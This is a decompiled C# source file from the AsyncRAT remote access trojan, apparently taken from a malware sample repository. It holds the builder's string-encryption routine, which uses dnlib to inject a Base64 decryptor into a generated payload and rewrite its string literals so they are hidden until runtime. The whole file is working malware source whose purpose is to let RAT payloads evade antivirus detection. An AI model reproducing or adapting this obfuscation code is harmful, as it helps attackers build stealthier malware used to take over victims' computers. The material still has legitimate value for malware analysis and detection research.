// Decompiled with JetBrains decompiler
// Type: Server.RenamingObfuscation.EncryptString
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server.RenamingObfuscation.Classes;
using Server.RenamingObfuscation.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Server.RenamingObfuscation
{
  public static class EncryptString
  {
    private static MethodDef InjectMethod(ModuleDef module, string methodName)
    {
      MethodDef methodDef = (MethodDef) InjectHelper.Inject(ModuleDefMD.Load(typeof (DecryptionHelper).Module).ResolveTypeDef(MDToken.ToRID(typeof (DecryptionHelper).MetadataToken)), module.GlobalType, module).Single<IDnlibDef>((Func<IDnlibDef, bool>) (method => UTF8String.op_Equality(((IFullName) method).Name, methodName)));
      foreach (MethodDef method in (IEnumerable<MethodDef>) module.GlobalType.Methods)
      {
        if (UTF8String.op_Equality(method.Name, ".ctor"))
        {
          module.GlobalType.Remove(method);
          break;
        }
      }
      return methodDef;
    }

    public static void DoEncrypt(ModuleDef inPath) => EncryptString.EncryptStrings(inPath);

    private static ModuleDef EncryptStrings(ModuleDef inModule)
    {
      ModuleDef module = inModule;
      ICrypto crypto = (ICrypto) new Base64();
      MethodDef methodDef = EncryptString.InjectMethod(module, "Decrypt_Base64");
      foreach (TypeDef type in (IEnumerable<TypeDef>) module.Types)
      {
        if (!type.IsGlobalModuleType && !UTF8String.op_Equality(type.Name, "Resources") && !UTF8String.op_Equality(type.Name, "Settings"))
        {
          foreach (MethodDef method in (IEnumerable<MethodDef>) type.Methods)
          {
            if (method.HasBody && method != methodDef)
            {
              method.Body.KeepOldMaxStack = true;
              for (int index = 0; index < ((ICollection<Instruction>) method.Body.Instructions).Count; ++index)
              {
                if (method.Body.Instructions[index].OpCode == OpCodes.Ldstr)
                {
                  string dataPlain = method.Body.Instructions[index].Operand.ToString();
                  method.Body.Instructions[index].Operand = (object) crypto.Encrypt(dataPlain);
                  method.Body.Instructions.Insert(index + 1, new Instruction(OpCodes.Call, (object) methodDef));
                }
              }
              method.Body.SimplifyBranches();
              method.Body.OptimizeBranches();
            }
          }
        }
      }
      return module;
    }
  }
}
